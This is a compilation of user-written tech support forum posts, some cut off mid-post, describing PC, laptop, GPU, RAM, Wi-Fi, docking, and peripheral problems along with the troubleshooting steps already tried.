Every once in a while the bluetooth or wifi just disappears. I tried to look up the reason for it myself, tried to update the software, but the only thing that seems to fix it temporarily is a hard reset. Like fully shut down, turn off power source, unplug from wall hard reset. And its okay for a while but then eventually it becomes a problem in a day or two.\n2. There's something wrong with the HDMI connection between the PC and my dual monitor setup. Every so often they die on me, shows no signal, but the monitors and the pc itself have power. I have to also do a hard reset to get it to work, but it only works for a while after that. There's also been some weird visual glitching at times like its having a seizure, no idea what that's about.\n\nSo basically I'm trying to figure out if any of this might be solvable, or if I'm going to have to pull warranty and get a replacement or something, because these issues have all been going on for a while now and I have no idea what to do."

I found a workaround which allowed me not to have any issues even during very intensive usage for the past year or so.\n\nA problem I never had was anything to do about my GPU \\[RTX 2080 super\\], it ran great and never caused issues until -allegedly - today.\n\nI tried out the new Kingdom Come Deliverance II game and although it ran smoothly yesterday and this morning, when I booted it tonight I could barely play 5min before graphical flickering, a quick freeze and then a complete PC crash occured. When I booted the PC back, the screen was afflicted by purple lines/rectangles and Windows didn't recognize the GPU anymore - although it DID ran on it since it's my only display output - the drivers were also completely gone.\n\nOnly, when installing the drivers and rebooting again, everything seems fixed, that is until I launch the game again and then the problem loops. I tried several times always with the same result and purple glitches. figured I would try with another demanding game and when playing Wukong, it did crash several times with now green artifacts/glitches but a simple restart \"fixes\" the issue (unlike the previous one, no need to reinstall the GPU drivers, the glitches don't persist until I start another game).\n\nThe temperatures are quite acceptable for high usage when the crashes occur (CPU \\~60°c .GPU \\~75°c) and I can't quite figure out what causes that, especially considering everything works perfectly right until the glitches/freezes occur. The RAM isn't overloaded (spec: 2x8gb RAM corsair 3600mhz) everything runs on SSDs and the PSU is a Corsair 750W.\n\nSo i don't quite know. Is my GPU dying but somehow still works 10min at a time ? Is it all caused by the same issues I had with my CPU despite the temps being normal ? Is it only a driver/BIOS issue ? Is anything else to blame or is everything wrong ??

I searched for information on the Internet and realized that the problem was in the driver. I rolled back to the driver that was before. It didn't help. Then I installed the 522 driver. Everything worked fine until one moment when I was playing CS2 and the game froze. Then sometimes a blue screen popped up and sometimes the game just froze. I decided to install an even older driver and it worked for a while. Now I decided to reinstall Windows in the hope that it would help. No. For a while everything was fine, then the problems started again. Now it's a purely random event, the game works fine for a while and then it just freezes. Why when the game freezes all programs related to the video card do not work. MSI Afterburner, GPU-Z, the performance tab in the task manager, even the device manager when trying to turn off the video card, but there was only one way out - restarting the laptop. I don't know what to do anymore. I don't think there could be any problem with the video card chip or other electronics. If there was a problem with the chip, it wouldn't work at all, right?

The touchpad toggle key doesn't work, and Windows 11 settings can't even detect the touchpad, so the only option that shows up is turn touchpad key on or off. I mentioned that I tried to uninstall the drivers, and that fixes the issue for a couple of days, and then the issue comes back. The other issue is that the right side USB port works intermittently. There's only one device that works when I insert it completely, while the rest needs to have be angled a certain way or inserted halfway. I have also tried to uninstall the drivers, and it didn't fix the main issue. The boot times can also be quite slow some days.\n\nI have uninstalled drivers, updated Windows, updated the BIOS, and have used MyAsus to diagnose any issues with my laptop, but it didn't really fix any of the issues above. Sure, this may seem like a non-issue, but it really bugs me. Thank you, and I hope this post gets an answer."

I was instructed to find the \"Intel Management Engine Interface\" in Device Manager, but nothing like that exists on my PC. I've also tried turning off the setting in Adv. Power Options to automatically turn off the hard disk, but doing so only increased the time it can stay on for and didn't solve the problem of it shutting down.\n\nI have an HP laptop with Windows 11 with build 26100.3037. The processor is an AMD Ryzen 5 7520 U."

I’ll write the summary here and the long form below:\n\nHardware: \n- AMD Ryzen 7 9800x3D\n- Gigabyte x870 Gaming Wifi6 rev:1.0\n- G.Skill Flare X5 DDR5-6000 16x2 (F5-6000J3038F16GX2-FX5)\n\nIssue: Motherboard fails to post to BIOS boot screen, DRAM light on\n\nSteps Taken:\n- Verified all components and cables were properly seated\n- Verified hardware compatibility through G.Skill and Gigabyte websites\n- Removed non-relevant hardware (GPU, NIC, SSD, NVME)\n- Allowed system to run for 15 minutes for memory training \n- tested each RAM stick individually in each channel\n- Reseated CPU\n- jumped CLR_CMOS pin to clear CMOS\n- Removed and replaced CMOS battery\n- Used Q-Flash to flash latest bios from usb drive \n- Changed keyboard (idk saw a guy say it worked)\n\n\nOkay, now the long form.\n\nI installed the CPU, RAM, cooler, and other components. Upon initial activation, the computer boots and I see the bios launch page, however when I pressed del it ignored the command. The PC instead continued to the windows login screen. \nUpon login, I was prompted to download Gigabyte control center. I hit “accept” and began the download, but halfway through the desktop crashes, with windows flashing the blue screen and say “computer has run into an issue and must restart” for half a second before shutting off. \n\nI then spent a day going through all of the manuals, support guides, and forum threads I could find pertaining to the issues and implementing whatever fixes I could find, short of trying new components. So far, I’ve had no success. \n\nAt present, the computer has all non-relevant components disconnected, and is just a motherboard, CPU with cooler, 1 stick of RAM, and the PSU.\n\nPowering on the system results in the DRAM light turning on and staying on. The screen stays dark, and I am unable to reach the BIOS screen. \n\n\nI’m hoping anybody might have some advice or a lead to investigate. The only thing left I could think of is to try a new set of ram, but I’d rather avoid spending more money if I could help it. \n\nI figure my options are to take it to a repair shop and have them look at it, try a new pair of RAM, or just RMA the board. \n\nAny and all advice is appreciated. Thank you for reading through this"

Now it says connection timed out.\n\nNow, the page will no longer load for me on ANY of my company network computers. It works fine on any computer outside the network - my house, friends house, phone (not on network) anywhere else except my business.\n\n\\-I logged in on my phone and permanently deleted the page with HTML. Still nothing  \n\\-I called my hosting provider (GoDaddy) and they said it sounds like a network issue. \n\n\\-I call my network manager and they spent 2 hours and found no abnormalities on the network. GoDaddy has always been very helpful and knowledgeable in the past so this was odd.\n\n\\-I called GoDaddy back and they are now saying to try my ISP\n\n\\-My ISP has a level 2 case open hoping to hear back soon to see if they have any idea what it could be.\n\n\\-I cannot ping the website from my PC, but i can go next door off of my network and ping the site\n\n\\-tracert has two timeout spots, both at my ISPs data centers\n\nHas anyone seen anything like this?

This is an issue I haven't been able to solve but with the information I've gathered I'm sure someone will have a solution.\n\nI downloaded the new Geforce Game Ready Driver the other day Version: 572.16 and everything has run completely fine. I've played many games with no issues other than Dark Souls III. The game had been running smoothly until then. I tried uninstalling the driver and opening the game and that worked, but ofcourse I need the driver so when i reinstalled the problem came up again. If the game is in windowed mode the problem goes away aswell but obviously windowed mode doesn't look as good and creates input lag. The other way It works is if I have the game on my second monitor on fullscreen which is severely worse than my main monitor. I've tried turning on and off G Sync and none of that has worked either. Hopefully there is a simple solution hidden deep in the NVidia settings. Thanks."

            "description": "Off the bat, this is my first Reddit post so sorry if anything is formatted weird. I bought my pc pre built in 2021 and I’ve never had any issues until a couple months ago it randomly stopped displaying to my monitor. Everything seemed to be running normal, all lights on, fan running, even connected to my Bluetooth speaker just no display. I had been just been playing games on it the night before. I had a friend look at it at the time (only somewhat knowledgeable but more then me) and the only solution he could figure out was taking out a ram stick. It’s worked fine since until I recently moved. As soon as I tried setting it up at my new place, same thing no display but everything else running fine. I figured it was a connectivity thing and something got knocked loose in the move so I had my bf open it up and check everything is connected and he even added back the ram stick I had taken out before (I’m not super comfortable going in there and messing around with stuff) but still no display. So I just kept everything plugged in and gave up for a couple days. Then randomly my cat jumped on my computer and hit the power button and it turned on and displayed to my monitor like nothing was wrong! I had to go to work so I quickly updated the game driver and just left it on till I got home. Now that I’m home I was looking around on my desktop and trying to clean up some things and I noticed a file that my ex still had on my pc (he used to edit videos and one week his computer was down so he used mine to edit and this was just a leftover video clip) so when I tried to delete it, it said something like “can’t delete because file is still running on shell infrastructure host” well I want to get rid of everything my ex still has left on my computer to I immediately go to task manager and try and find shell infrastructure host and when I found it, I clicked something like “open in files”. I don’t know much about this stuff but I was trying to idk find the video file around in there and delete it there or something. But I ended up just double clicking “sihost.exe” (im trying my best to recall the order in which I clicked stuff and what it was named) and once I clicked that, everything on the screen got a little bigger and then I noticed that “shell infrastructure host” was showing up twice in task manager so I thought that I accidentally started it up twice somehow and so I picked one and closed it but everything was still big on screen so I restarted my computer and now it’s back to not displaying anything on the monitor again. It’s just a black screen. I know I’m really not knowledgeable about my pc and I probably shouldn’t have been messing with anything but now I’m really lost on where to even begin trying to fix it since there’s just a blank screen. I would really appreciate any help or tips \n \nHere’s a list of my pc specs that I got when I bought my pc \n\nCPU - intel l7 8700k 4.7Ghz boost clock 6 cores 12 threads \nGPU - RTX 3060 TI Gigabyte Auros\nRam- 16 GB EVGA SC DDR4\nLiquid cooling 120 rad\nStorage - 1TB western digital SSD with windows 10 \nMotherboard - Asrock Z390 Phantom gaming \nPower supply - 650w gold rated \n"

I decided to boot it up, see if it's for any good. But for some reason, it cannot connect to my wifi. It literally does not see the network. I have a 5G network as well as 4G one for my printer. And it won't connect to either them. I restarted the laptop. I updated the drivers. But it sees every Wifi network but mine. It can connect to my neighbors wifi but not mine. I checked the router settings but nothing was blocking the connection. When I connected the laptop to the router by cable, it worked and connected to my Wifi but that's it. I messed with the laptop's setting. But nothing worked. At this point I searched every internet forum but none of the solutions seem to work. I asked a bunch of friends but they don't know either. So I'd appreciate any help on that topic. \n\n  \nPlease note that English is not my first language and I'm also not a tech pro. "

My issue is my hard drive is slowing down the system. I think it might need an update to SSD, or even just a format to clean it up.\n\nI've defragged, removed shit programs, run AV and it doesn't seem to help. I think it's the actual drive\n\nI'm debating between 3 options, trying to balance cost efficency and performance, as the laptop is currently almost unusable with it's current condition and I'm tight on funds until probably end of the year\n\n\n1. Buy new laptop, budget is about 1200 CAD, which should get what I need but would have to wait a few months to do so\n\n2. Upgrade the hard drive to be ssd- seems somewhat reasonable, but not sure if it's soldered to the system as a whole. I thought it wasnt but was reading it may be. Would have to clone the drive, which seems reasonable\n\n3. Clone the drive, format, and reinstall. Not sure if this will fix it, but it's probably the most cost efficient at the moment, as the cash is tight at the moment.  Any idea if this will actually work to speed it up or am I just reinstalling my problem as it's the actual drive.\n\nAny advice/thoughts would be appreciated here, thanks"

I purchased the following USB adapter: [https://www.tp-link.com/ca/support/download/archer-tx20uh/v1/](https://www.tp-link.com/ca/support/download/archer-tx20uh/v1/)\n\n  \nWhile it works great 99% of the time, maybe once or twice an hour it seems to hiccup or cut out momentarily. It had this issue originally, I dont believe I managed to troubleshoot it then but it did seem to go away for a few months, but now its back.\n\nHere is a ping to google while it happens and it always looks almost identical to this - 3 or 4 seconds of ping spike(sometimes so bad it fails to get a response but rarely) before dropping back to normal:  \n[https://imgur.com/a/EY8l9c3](https://imgur.com/a/EY8l9c3)\n\n  \nI've had my wifes laptop open and pinging right next to it and it does not receive these spikes so it seems unlikely its the wireless signal.\n\nThings I've tried:\n\nPower Cyclling Modem\n\nReinstalling drivers\n\nRolling back drivers\n\nReinstalling windows\n\nSwitching USB ports\n\nPlugging the adapter directly into the USB port(as opposed to its little housing with a cord that plugs in)\n\nDisabling auto-configuration following these steps [https://www.reddit.com/r/summonerschool/comments/4okzog/how\\_to\\_get\\_rid\\_of\\_ping\\_spikes\\_on\\_wireless\\_helped/](https://www.reddit.com/r/summonerschool/comments/4okzog/how_to_get_rid_of_ping_spikes_on_wireless_helped/)\n\nI was also gaming last night with a friend using the games built in voice chat and experienced one of these spikes - the game lagged, however he was talking the whole time and there was no breakup of his voice which was even more puzzling.\n\nSearching online I cant seem to find anything else to try(the majority of help seems to just say update drivers). At this point I am thinking I just need to buy a new adapter but money is tight and I am worried it may not fix anything. If anyone has any suggestions before I go that route it would be greatly appreciated! Also if there is an easier way to monitor this rather than just pinging google from cmd, that might help as so far I cant tell if there's any pattern to it - if its every 30 minutes on the nose, gets worse during peak hours when more neighbors are using their wifi in my building, etc.\n\n"

Also, are there any issues to look out for when dual booting? The main use for this external SSD would be to take tests, so if it is prone to issues it might not be worth it. \n\nI am willing to invest some time into making sure that it works properly and fixing anything that is broken, if I can.

Eventually I decided it had to be the display driver or some hardware problem with the GPU (I just tried so many other things)\n\nSo today I tried to DDU the display driver off the machine completely and then install it back to see if that would fix the problem. Unfortunately, that seems to have made it unusable. After reinstalling I get about 5 seconds of display and then it'll disappear or go to a completely solid color. This is only after the installation of Nvidia drivers. And it seems to act fine while it is in safe mode.\n\nJust wanted to know if anyone had any other ideas as to what it could be (potentially Windows or other hardware like motherboard or PSU).

It seems like it wants me to reinstall the game, but I can’t because the game is already on the hard drive and taking up all the space lol. Sorry this may be confusing."

            "description": "Hi all, hope you're having a lovely day.\nBefore anything else, here's the specs dump of my patient for later:\n\n- i7 11700K, \n- Gigabyte Z590 Aorus elite ax, \n- Crucial Ballistix 2x16gb ddr4 3200mhz cl16, \n- Crucial T500 1tb, \n- Gigabyte 3060 Ti, \n- Corsair RM650x\n\nSome background: my computer started having stability issues with XMP quite a while ago, but i always kept the problem at bay by simply not using XMP. Any modifications i did to voltage, timings and gear did nothing. My educated guess is a bios update with some wrong timings did the fuckery.\n\nNow, another very odd issue: after i upgraded my old Crucial T5 (gen 3) with a newer Crucial T500 (Gen 4), one stick of RAM gets detected as a 0gb, unidentifiable stick of ram, which is always the stick in the DDR4_B2 slot. Try to using just one stick leads to the pc not booting at all (stuck on RAM debug led). Swapping memory sticks changes nothing. Using another kit of DDR4 memory did nothing (2x8gb, same speed).\n\nHere's what else i did so far:\n- All the basics, disassembling and reassembling everything, spraying isopropyl alcohol on everything, checking cables, checking bent pins... nothing changed;\n- flashing bios, upgrading bios with q flash plus, booting with fast boot, setting the M2A_CPU slot to Gen3 speed... nothing changed;\n-  installing my P5 only in the M2A_CPU gen4 slot, installing my T500 only in the same slot, installing the same drive in the M2B_SB gen3 slot (linked to the chipset): the issue starts only with the gen4 ssd in the proper gen4 slot, and with the old ssd i can boot with just one stick.\n\nFollowing the block diagram of my motherboard, the issue is located somewhere in the LGA1200 CPU circuit, and after fixing nothing with a RAM swap, my main suspect for now is i either fucked the CPU or the motherboard at some point.\n\nI'm still about to test the PSU cables with a multimeter but i HARDLY believe that less than 10 watts more on a 3 years old, 80+ gold rated PSU are the culprit. I'm also VERY afraid to try a CPU swap right now, because if my mobo is cooked it may kick in the head any CPU.\nOh, the Intel RTS on/off button is also gone now. Don't ask me why: i'm now clueless.\n\nIs there something obvious i am missing? Am i disabled? Thank you for reading."

            "description": "Hey everyone,\n\nA while ago, Windows started crashing with a BSOD on boot. I didn’t really check the exact error and just decided to reinstall Windows.\n\n# What I Tried:\n\n1. **First reinstall:** Formatted only the previous Windows partition and reinstalled. Got stuck in a BSOD boot loop with `KERNEL_DATA_INPAGE_ERROR`.\n2. **Second reinstall:** Used a different USB drive with a fresh ISO from Microsoft, formatted the entire drive, but still got BSODs. This time the errors were either `BAD_SYSTEM_CONFIG_INFO` or just `0xc0000218`.\n3. At this point, I was almost convinced that my M.2 SSD (which I am using for 3 years already) was failing and needed replacement.\n4. **Tried Linux:** As a last resort, I installed Linux. Manually formatted the drive using `cfdisk`, created an EFI FAT32 partition + two EXT4 partitions, installed GRUB, and... it works flawlessly.

If i try to change  ConservationIdleTime and PerformanceIdleTime to ff ff ff ff but IdlePowerState to 00 00 00 00, the keys in 0000 keep the changes as intended but the keys under the 0005 folder, all change to 00 00 00 00, even the once that were supposed to be ff ff ff ff. Once again, problem remains.  \nI have also tried the solution proposed in this video:\n\n[//www.youtube.com/watch?v=DSjVja-0EDg](//www.youtube.com/watch?v=DSjVja-0EDg)\n\nInstead this time when i downgrade my drive to the standart windows one, my sound doesnt work at all.\n\nIf anyone could help me out, it would be greatly appriciated!"

Every time I use GI it ended up not letting me load into windows and does something to system 32 so I cant use the OS anymore. As well as whenever I do 240hz through display settings my screen will go black then turn back on at 60hz. I've looked everywhere I can for a solution and didn't find anything and as far as I know having GI enabled is the only way to use the 240hz, so any tips would be very helpful.

            "description": "Hey everyone!\n\nRecently I've bought a new SSD for my laptop. Then I created a recovery USB and installed a fresh version of win10 on it, following the official guidelines (removed HDD, installed, set SSD as bootable, returned HDD and some other less important things).\n\nThen:\n\n1. Installed all the updates from windows update center\n2. Installed all the drivers from official website\n3. Merged all partitions on HDD (built-in recovery, win recovery and windows, since all of them will never be used again)\n4. Slow-Formatted my HDD\n5. Runned all the other maintanance (defragment, sfc scan etc.)\n\nThe idea was to get a completely fresh start and significantly improve QOL.\n\n\\*\\*I did not perform any sort bios updates\\*\\*\n\nEverything worked. BUT, in the process, I've noticed some strange microfreezes. They do not follow any pattern, just that my system stops responding for a \\~0.5-1.5 sec. It can happen as often as once each minute. In that moment, if I play any game, it keeps working (game engine DOES NOT STOP), just sending my input before the freeze, even if i do not hold the button anymore. Another frustrating detail: if I'm renaming some file at the time, system just escapes, so the name is preserved as it was (as if I've pressed esc)\n\nThe final thing I've noticed is that sometimes during that freeze, some program appears in a tray and than disappears, or my cursor turns into a \"thinking sprite\"\n\n\\*\\*That is unlikely to be a malware problem. I did not experience this before the upgrade, and did not install anything suspicios since\\*\\*\n\nThat is not a minor incovenience: my experience was much better off before the upgrade. Even writing this message, I've experienced that annoyance \\~14 times.\n\nSystem config:  \n\\* Model: MSI GL62M 7REX  \n\\* Intel core I7 7700K  \n\\* NVidia GForce 1050TI  \n\\* MSI M450 500GB (SSD)  \n\\* 16 GB RAM  \n\\* Win10 Home 22H2 One Language 19045.5440\n\nFull specification: [Specification GL62M 7REX | MSI Global - The Leading Brand in High-end Gaming &amp; Professional Creation](https://www.msi.com/Laptop/GL62M-7REX/Specification)\n\nDid anyone encounter that strange anomaly? Even if not, what can I at least try to do? I wasn't able to find anything on the internet. Help!\n\nThanks in advance!\n\nUPD:  \nI've managed to pinpoint the problem. Turns out that sometimes Intel's and NVidia's drivers are silently incompatible which leads to Windows built-ins (such as a friking SLIDE SHOW OF THE WALLPAPER) behaving in this obtrusive way. My current workaround is to disable slide show, until I have the time to fix my drivers."

What I'm noticing the most is FPS inconsistency, dropping from more than 100 fps to below 60 briefly in the same scenes. Clear examples of this have happened in Final Fantasy 7 Rebirth, where I'm seeing benchmarking videos of people maintaining absolutely stable 120 fps with the same settings I'm running. I also noticed this while running the benchmarking tool for Monster Hunter Wilds after seeing people with my GPU with average fps of around 130\\~ fps while i struggle at 85\\~ fps with the same graphical settings, DLSS options and Frame Generation activated. CPU temps average at around 75\\~ºC and max out at 80ºC for extremely brief moments.\n\nI'd appreciate it if someone could tell me what I could troubleshoot to make sure my system is OK, but as a big computer noob I suspect that my outdated BIOS version might be causing this. GPU drivers are up to date and I've followed guides for settings in Nvidia App and Nvidia control panel. I'll provide further information if needed to understand what's going on with my system."

I got this custom order prebuilt from a shop I trust.\nSo the story starts on 30/01/2025. I was loading into Roblox Studio, and noticed that my fps was being at 30 or below. I also noticed that my animated wallpaper from WE was going at 30fps as well (the leaves were falling). Normally it's at 240fps (I have a 240hz). For a few days this happens a bit. It's more of a lottery. Sometimes I start my PC and this happens, and sometimes it doesn't. Well, since yesterday (04/02/2025), I launched my PC and everything was fine. Until a few minutes later and I got the bug. CPU related software was bugged the hell out. Although GPU intensive games run fine, so l know it's not the monitor or the GPU at fault here. To test my theory, I loaded up a CPU intensive game (Roblox was the only one I could think of that utilizes nearly 100% of your CPU), and it got 30fps on the dot, or lower.\nSo like, I have been having this problem now and, I am open for any possible solutions.

Real light usage.\n\nFor the little less than two years I have had it, It has been serviceable, until it wasn't for no particular reason. Now if the power goes out (or if I test the UPS through ViewPower - another *non-stellar* software, I seem to undestand, but I'm not clear on good alternatives) the UPS stays on (green light) but the battery doesn't kick in at all, not even a little (it used to lightly buzz and beep, now it is completely silent), and the desktop immediately turns off. I've moved the wires around just to see if something changed, and it didn't, but all 4 outlets should be both battery and surge-protection anyway.\n\nNow, before I go appealing to the last month-or-so of warranty, is there a way to check if something is actually wrong or if maybe I unchecked something via Viewpower (which I uninstalled and installed again, so I don't think that's the case) to make it not work?  \nThis is the main screen from Viewpower, in case that could be useful. Battery seems fine, but I don't know if that's of any value: [viewpower screen](https://i.imgur.com/zbbAGzB.png). I'm not sure about that 27.1 V since the batteries are supposed to be 12V, but I really don't understand anything about power matters and I have no idea if that's normal or not. Guess that's because there's 2 of them?\n\nThank you for any help you might give, and sorry if I'm such a knucklehead bout it."

As far as I can tell nothing special has changed, no new software or hardware or changes to either the computer or the router, just one day it started saying \"Cannot connect to network\".\n\nThe PC CAN see multiple other WiFi networks from the neighbours so I don't think it's hardware. Laptops and phones will connect to the WiFi without issues. I followed all Windows' recommended troubleshooting steps and nothing worked.\n\nI rebooted the PC and the router. I let windows troubleshooter reset the WiFi network adapter. I uninstalled and reinstalled the WiFi drivers. I clicked to forget the network then reconnect after triple checking the password. I logged in to the router admin console to check it wasn't set to block the device or that two devices had been allocated the same IP Address. All I can get from any of it is \"Cannot connect to network\", no more detailed messages and I wasn't able to track down better error lots in Event viewer.\n\nOne thing I tried DID work. Physically carrying the PC downstairs and connecting to the router with ethernet. I installed Windows Updates (The 2024 H2 pack was needed but the last update was a week earlier so it wasn't massively out of date). Then I tried the WiFi again and it connected without issues. So I took the PC upstairs and declared victory. Except two days later it's doing it again \"Cannot connect to network\". It shows as full signal strength even upstairs and it wouldn't connect to WiFi when sat next to the router so I don't think it's a signal issue.\n\nI'm stumped. My Windows tech knowledge is a decade out of date, I was a master at XP, Vista and 7 but Windows 11 is alien to me. I can't go over to my parents to do the same fruitless troubleshooting every couple of days and they're torn between buying a new PC or drilling holes in the ceiling to plumb in the ethernet cable.\n\nI appreciate this is difficult to comment on without being able to investigate directly but I'm sick of googling \"Cannot connect to network\" and getting suggestions like \"is the password wrong?\" or really generic suggestions given for any Windows issue like \"reinstall drivers\" or \"rollback windows updates\".

My graphics drivers have started to crash very often, always when im playing games, even undemanding ones. My external monitor flickers, freezes and colorful pixels show up, then the laptop usually bluescreens or stays frozen until i turn it off. I've been desperately trying to fix it, did stuff like changing the thermal paste (unfortunately that was the first time since purchase), tried different drivers, power plans but nothing is working so far. I eventually gave up trying, thinking this was happening due to the gpu's age and everyday use. Recently though, i decided to try switching to integrated graphics instead. I wanted to play minecraft without it crashing, which wouldn't rlly require a good gpu. But I encountered the same exact problem, my graphics drivers crashed and the laptop bluescreened. I'm not very tech savvy, but this makes me think this is actually a software, not a hardware issue. I haven't used integrated graphics at all, and my cpu works perfectly fine, so this really confuses me. Anyone got an idea what the problem might be? Is there any hope i can still fix it?

            "description": "Hey Reddit,  \n\nI’m reaching out to the community for help with a persistent issue involving the **HP Thunderbolt Dock 120W G4** and **HP EliteBook 840 G11**. Despite updating all devices to the latest firmware, we’re facing two major problems:  \n\n1. **Ethernet Connectivity Issues**: When connected to the dock, the Ethernet connection fails to work. The network adapter appears in Device Manager, but it reports \"Network cable unplugged,\" and the LEDs on the RJ-45 port don’t light up. This issue persists even after reinstalling drivers and firmware.  \n\n2. **Display Flickering/Blackouts**: Some users are experiencing intermittent screen blackouts for a few seconds, which is disruptive during work.  \n\n**What We’ve Tried**:  \n- Updated the dock and laptop to the latest firmware and drivers.  \n- Reinstalled Ethernet drivers manually, including the HP-recommended version (sp139326.exe).  \n- Checked BIOS settings, including Thunderbolt security options.  \n- Reset network configurations and flushed DNS.  \n\n**Additional Context**:  \n- The Ethernet issue seems to be related to the Intel I225-LMvP driver, where Microsoft’s automatic updates sometimes override the working HP driver with a buggy version (2.1.2.3).  \n- The display issue might be tied to USB-C/Thunderbolt connectivity, as similar problems have been reported with other HP docks.  \n\n**Questions for the Community**:  \n1. Has anyone successfully resolved similar Ethernet issues with the HP Thunderbolt Dock G4?  \n2. Are there specific BIOS or driver settings that could help stabilize the display connection?  \n3. Are there any known workarounds or third-party tools that could prevent Microsoft from overriding the HP drivers?  \n\nAny advice or shared experiences would be greatly appreciated. This issue is affecting productivity, and we’re hoping to find a solution soon.  \n\nThanks in advance!  \n"

When it crashes it does so with no clear sign of the pc not working, just blue screens me with a KERNEL_SECURITY_CHECK_FAILURE error that I really don’t understand. I still haven’t tried re-installing Windows on the drive and I may have missed some troubleshooting practises, maybe you guys can give me a better diagnosis. Pc works phenomenally on MacOS so I highly doubt it’s memory bloat or bad ram in general.

I naively figured I could reinstall the graphics files if I deleted them from System settings and storage, which made my issue worse. It seems now the hardware is missing, and when I try to run the clean installation, I keep getting errors telling me that the installation has failed. \n\nI’m at a loss on what to do as NVidia support had the nerve to tell me to get a new graphics card, when they should be able to provide whatever files I need to reinstall their program. \n\nIf anyone has any steps or ways around this please let me know. I’ve heard of DDU but I’m a bit nervous as I keep seeing warnings appear telling me messing with it could make my problem worse. Any help is appreciated. "

I live on the opposite side of the country so it's really hard for me to troubleshoot over the phone when she runs into issues. \n\nI'm visiting her today, I'll have access to her router/tv.\n\nSome other issues she has had is:\n- turning the tv on\n- deleting/hiding/burying YouTube app (by accidentally installing random crap)\n-signing out of my YouTube account (this is typically worst case because I then need a friend in town to go over and re- sign her in)\n\nAll she needs and wants is YouTube for church.  I've put parental controls on so that she can't accidentally buy stuff and I thought i had it setup to where she can't delete/ install new apps but it would seem I haven't. \n\nAny help is appreciated.  Ideally I'd be looking for something like TeamViewer that does not require any input from her,  so that I  just screen share her tv from my phone/ computer. \n\nAs an additional note,  is there something similar to ublock for Android TVs?

I own a PC and a PS5 and because its University accommodation, I have to use the unis internet.\nNow like most school wifis, to use it you need to sign in with your school ID through an external site before accessing the network, that way its only for uni students. \nFor my PC this is fine but, consoles (in this case my PS5) dont support this security type. In the past at my old student acom, they provided residents with an alternate network specifically for consoles to get around this security issue which was great. However I now live at a different student acom that doesnt have access to this work around and has no plans on implementing it. So the only network I have access to is the standard Uni wifi my PS5 cant connect to. \n\nAt the moment I am using my PC to hotspot my PS5 and Im getting by fine that way. However its really slow and inconsistent. My support question is looking for an alternative. \n\nI do not have access to a router of any kind, I have a LAN cable but due to the afformentioned lack of router access, no obvious use for it. I have seen that you can link a PC and a PS with it but I dont know how to do that and Im struggling to find tutorials. \n\nIf theres a better alternative let me know, Id like to keep it cost effective if not free to the best of my ability. \n\nThankyou "

And I'm trying to just get it to come out of the monitor speakers anyway (or even possible conenct it to a wired speaker but idk how to do that) I've tried everything from the basic tips of making sure my monitor has speakers (lmao), the sound is turned on and up, and I've even done multiple live microsoft support sessions where a tech support worker takes over my computer remotely to check/update drivers. I've seemingly done everything under the sun and there is still no audio. I'm wondering if there may be a problem with the motherboard or something needing an audio card or something??

The main problem here however is that I am having touble setting up my previous drive, it seems to detect my singular drive as 2, I think this has to do with my formating of these drives as it seems to think they're both a sigular unit. Furthermore, when I go to initialise my drive it says that a \"drive which does not exist was specified\". I also would like to say that I had nothing too important on these drives, so if deleating everthing is the answer I'll accept it.   \n\n\nAgain, any help would be greatly appreciated.

I have had Windows 11 freshly reinstalled and had my laptop returned to factory settings, all drivers are up-to-date. \n\nI have sought out technicians who reinstalled Windows 11 and have effectively had the laptop restored to factory settings in an attempt to rule out corrupted drivers. Windows 11 is up-to-date, as is NVIDIA and the BIOS. There are no signs of overheating.\n\n**SPECS:**\n\n* ASUS ROG Strix G614JIR (I haven't upgraded or changed any parts)\n* RAM: 32GB\n* SSD MEMORY: 1TB\n* GPU #1: RTX 3070\n* GPU #2: Intel Core i9\n\nI've scanned with **sfc, chkdsk** and **DISM** which did not find any issues. MemTest86 also came out clear but I'm willing to run it a few more times if necessary in case it's RAM related. I'm worried it might be some hardware issue that software just isn't picking up on.  \n  \nI mainly get BSODs such as **IRQL\\_NOT\\_LESS\\_OR\\_EQUAL**, **PAGE\\_FAULT\\_IN\\_NONPAGED\\_AREA** and **SYSTEM\\_SERVICE\\_EXCEPTION**. I will get them just from browsing or otherwise at random. I only have the most recent logs on-hand.\n\n**Event Viewer** also showed errors in the Service Control Manager multiple times with \"The NVIDIA LocalSystem Container service terminated unexpectedly\" under General. Otherwise, issues with DCOM. \n\n  \n(It's also worth noting that I had BSOD's literally straight out of the box when using a USB port. I regret not sending it back way back then since I'm wondering if there might have been a manufacturing issue. I unfortunately don't have these dmp files on hand as they occurred a year or so ago).\n\nAny help to further troubleshoot causes of this would be greatly appreciated.

I am trying to wrap my head around the widely spread statement (fact?) that inserting a 3rd memory module on top of 2 existing memory modules, which run in dual channel configuration, will cause the new, 3rd, memory module to run in single channel configuration.   \n  \nAssuming i have 4 memory module slots, lets say DIMM 1,2,3 and 4.  \n1+3 plus 2+4 are each a separate channel, 1+2 are on the first channel and 3+4 are on the other channel.  \nI already have one memory module each in slots 2 and 4, running in dual channel mode.  \nnow i insert a 3rd memory module in slot 1.   \n  \nDual-channel means, in my understanding, that a separate memory controller handles the memory module, hence improving the performance overall.\n\nAccording to many websites and discussions, with this 3 module setup, slots 2 and 4 would continue to be used in dual channel mode, while slot 1 would now run in single channel mode. But as i now have two memory sticks on the same channel (in slots 1 and 2), wouldnt that channel now be shared between this two ram modules? Meaning one channel / memory controller has to handle the modules in slots 1+2 and the other only handles the module in slot 4?\n\nHow can the computer continue to use slots 2 and 4 in dual channel mode when slot 1 is on the same channel as slot 2? Shouldnt that half the performance of slot 2 and make both modules (slot 1 and 2) operate with reduced performance? Why would slot 1 be in single channel mode but slot 2 not?\n\nI think i took a mental wrong turn somewhere. "

Checked BIOS/UEFI settings:\n\nSecure Boot is disabled.\n\nBoot mode is set to UEFI (I also tried Legacy, but it didn’t help).\n\nChanged boot priority to ensure the USB is first.\n\n\n\n2.

All I did was turn it on the day before and turn it off normally, it worked fine.\nIs there a way to get more detailed feedback during boot to see what’s going wrong?\n\nWhat other steps would you recommend to diagnose or fix this issue?\n\n\nI’m really stressed because the laptop was working when I got it, and now I can’t even install the SSD.

